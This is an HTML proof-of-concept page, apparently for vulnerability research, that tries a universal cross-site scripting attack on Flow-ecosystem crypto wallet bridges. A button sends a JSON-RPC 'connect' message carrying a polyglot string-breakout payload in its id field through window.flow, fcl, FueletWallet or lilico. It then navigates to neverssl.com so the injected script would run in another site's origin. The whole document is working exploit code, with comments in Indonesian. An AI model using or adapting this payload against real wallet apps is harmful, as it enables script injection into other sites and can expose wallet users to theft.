<!DOCTYPE html>
<html>
<head>
    <title>PoC UXSS Final</title>
</head>
<body style="background:#000; color:#00ef8b; text-align:center;">
    <h1>Flow Wallet Bypass Test</h1>
    <button id="go" style="padding:20px; background:#00ef8b; font-weight:bold;">CLICK TO BYPASS</button>

    <script>
        document.getElementById('go').onclick = function() {
            // Target: Situs tanpa proteksi ketat (NeverSSL)
            const target = "http://neverssl.com";

            // PAYLOAD POLYGLOT:
            // Menggunakan kombinasi tanda kutip dan penutup kurung 
            // untuk mencoba memutus berbagai jenis format string di Native.
            const p = '");}alert(origin);{("';

            const request = {
                type: 'request',
                target: 'FuelContentScript',
                request: {
                    jsonrpc: '2.0',
                    id: p,
                    method: 'connect',
                    params: {}
                }
            };

            // Mencoba mengirim ke semua jembatan komunikasi yang umum
            const bridge = window.flow || window.fcl || window.FueletWallet || window.lilico;

            if (bridge) {
                bridge.postMessage(JSON.stringify(request));
                
                // Jeda 300ms agar Native punya waktu memproses sebelum navigasi
                setTimeout(() => {
                    window.location.href = target;
                }, 300);
            } else {
                alert("Objek Wallet tidak ditemukan!");
            }
        };
    </script>
</body>
</html>
